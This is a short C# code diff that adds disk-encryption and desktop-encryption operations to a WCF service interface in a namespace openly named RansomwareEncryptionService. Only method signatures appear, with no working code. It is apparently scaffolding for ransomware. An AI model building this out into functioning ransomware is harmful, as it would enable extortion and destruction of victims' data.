@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.Serialization;
+using System.Security.Cryptography.X509Certificates;
 using System.ServiceModel;
 using System.Text;
 
@@ -11,6 +12,14 @@ namespace RansomwareEncryptionService
 	[ServiceContract]
 	public interface IEncryptDisk
 	{
+		[OperationContract]
+		bool encryptDisk();
+
+		[OperationContract]
+		bool encryptDesktop();
+
+		[OperationContract]
+		string getLastEncryptedFile();
 
 	}
 
